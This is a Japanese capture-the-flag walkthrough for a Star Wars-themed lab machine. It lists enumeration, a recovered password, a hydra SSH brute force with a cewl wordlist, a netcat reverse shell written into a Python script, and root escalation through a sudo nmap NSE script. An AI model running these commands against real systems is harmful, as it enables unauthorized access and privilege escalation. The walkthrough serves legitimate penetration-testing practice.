### 注意
- ステガノグラフィができないので暗号が解読できない。stylesuxx.github.ioを使ってもパスワードが出てこない

## 攻略
- nmap
  - 22,80 
- サイトを見る
  - ソースに暗号みたいのがあって、これを解読するとURLになっていて、ステガノグラフィをするとパスワードが出てくるが、ここでは出てこないので書いておくと`babyYoda123`
- gobusterする
  - robots.txt,adminが出てくる。javascriptという気になるのもある
  - もう一度gobusterでオプション`-x js`をつける
  - users.jsが見つかる
- users.jsを見ると、hanとskywalkerが出てくる
- ssh
  - `ssh han@$IP` password:babyYoda123
- ユーザをチェック
  - `ls /home`
  - Darth,han,skywalkerが見つかる
- SUID
  - pkexecがある 
- homeを調べる
  - `.secrets -> note.txt`にヒントがある
  - `.bash_history`
- hanでDarthのhomeを見る
  - evil.pyというのがあるが、これはDarkにしか書き込みができない 
- `cewl http://$IP/r2d2 > dict.txt`
  - オプションが付いてないが、デフォルトが`-d 2`はフォルダが２つ下まで探す。`-m 3`単語が3文字以上を探す 
- `hydra -l skywalker -P dict.txt ssh://$IP`
  - password:tatooine
- skywalkerでssh
- `cd /home/Darth`
- evil.pyの下にリバースシェルを書き込む
```
import os
os.system("nc -e /bin/bash 192.168.56.101 9001")
```
- Darthになる
  - nc -nlvp 9001で待ち受ける
- `sudo -l`
  - nmapがsudoで使える
- rootになる 
  - `echo "os.execute('/bin/sh')" > /tmp/root.nse`
  - `sudo nmap --script=/tmp/root.nse`
